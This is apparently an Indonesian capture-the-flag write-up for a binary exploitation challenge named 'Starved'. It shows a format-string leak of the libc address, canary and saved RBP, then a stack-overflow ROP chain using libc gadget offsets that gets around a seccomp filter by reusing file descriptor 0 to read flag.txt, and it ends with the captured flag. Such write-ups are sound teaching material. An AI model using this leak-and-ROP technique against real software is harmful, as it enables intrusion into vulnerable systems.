# Starved

## Enumeration

Pertama, konek ke service menggunakan netcat.

```bash
nc s1.nfx.my.id 49633
```

Dari deskripsi challenge, program meminta nickname sebelum menerima request upload. Ada dua bagian yg menarik, yaitu proses input nickname dan proses upload yg menggunakan ukuran dari client.

Setelah mendapatkan file challenge beserta `libc.so.6`, lakukan analisis binary menggunakan `checksec` dan decompiler seperti Ghidra.

## Analisis Vulnerability

Ditemukan dua vulnerability pada program.

### 1. Format String Vulnerability

Pada fungsi `leaker()`, input nickname langsung diberikan ke `printf()` tanpa format string.

```c
printf(buf);
```

Hal ini menyebabkan format string vulnerability karena input kita bisa dipakai untuk membaca isi stack menggunakan format specifier seperti `%p`.

Dari hasil pengujian, kita bisa mendapatkan tiga informasi penting menggunakan:

```text
%3$p.%27$p.%28$p
```

Hasilnya berupa:

- `%3$p` : alamat libc.
- `%27$p` : stack canary.
- `%28$p` : saved RBP dari `main()`.

Alamat libc bisa dihitung dengan mengurangi leak menggunakan offset `0x1149d7`.

```python
libc_base = libc_leak - 0x1149d7
```

Sedangkan alamat buffer dapat dihitung dari saved RBP.

```python
buf_addr = main_rbp - 0x1a0
```

Dengan begitu, kita sudah mendapatkan alamat penting yg dibutuhkan untuk menyusun ROP chain.

### 2. Stack Buffer Overflow

Pada fungsi `main()`, program menerima header berukuran 8 byte yg berisi size dan magic value.

Jika magic value bernilai `0xdead`, program akan membaca data menggunakan:

```c
read(0, buf, size);
```

Masalahnya, nilai `size` sepenuhnya dikontrol oleh client dan tidak ada pengecekan batas ukuran buffer.

Akibatnya kita bisa mengirim payload melebihi ukuran buffer sampai menimpa saved RBP dan return address.

Sebelum return address, kita harus memasukkan stack canary yg sudah didapat dari format string leak agar proteksi stack canary tidak menggagalkan exploit.

## Seccomp Analysis

Program menggunakan seccomp untuk membatasi system call.

Beberapa syscall yg diizinkan antara lain:

- `read`
- `write`
- `close`
- `openat`
- `fstat`
- `pread64`
- `lseek`
- `brk`
- `exit`

Karena `execve` tidak diizinkan, kita tidak bisa menggunakan cara biasa untuk mendapatkan shell.

Solusinya adalah menggunakan teknik ORW (Open, Read, Write) melalui ROP chain.

Ada satu batasan lagi, yaitu `read()` hanya diizinkan jika file descriptor bernilai `0`.

Untuk mengatasinya, kita bisa melakukan:

1. `close(0)` untuk menutup stdin.
2. `openat()` untuk membuka `flag.txt`.
3. File descriptor yg tersedia paling rendah akan digunakan kembali, yaitu `0`.
4. `read(0, ...)` untuk membaca isi flag.
5. `write(1, ...)` untuk mengirim hasilnya ke stdout.

## Exploitation

Buat script `exploit.py` menggunakan Python dan pwntools atau socket.

Pertama, kirim payload format string untuk mendapatkan leak.

```python
fmt_payload = b"%3$p.%27$p.%28$p\n"
```

Setelah mendapatkan leak, hitung base address libc, canary, dan alamat buffer.

```python
libc_base = libc_leak - 0x1149d7
buf_addr = main_rbp - 0x1a0
```

Selanjutnya gunakan gadget dari `libc.so.6` yg disediakan pada file challenge.

```python
G_POP_RDI = 0x2a3e5
G_POP_RSI = 0x2be51
G_POP_RDX_POP_R12 = 0x11f437
G_POP_RAX = 0x45eb0
G_SYSCALL = 0x912d6
```

Setiap gadget ditambahkan dengan base address libc yg sudah didapat.

ROP chain disusun untuk menjalankan syscall berikut:

```text
close(0)
openat(AT_FDCWD, "flag.txt", O_RDONLY)
read(0, scratch, 0x200)
write(1, scratch, 0x200)
exit(0)
```

Setelah ROP chain selesai, susun payload dengan urutan:

```text
"flag.txt"
Padding
Stack Canary
Saved RBP
ROP Chain
```

Kirim header dengan magic value `0xdead`, kemudian kirim payload overflow.

```python
header = struct.pack("<II", len(payload), 0xdead)

conn.send(header)
conn.send(payload)
```

Exploit berhasil mengambil isi `flag.txt` dan mengirimkannya kembali melalui stdout.

## Flag

Setelah exploit berhasil dijalankan, didapatkan flag:

```text
NFX{st4rv3d_s3cc0mp_fd0_r3us3_r0p_m4st3r}
```
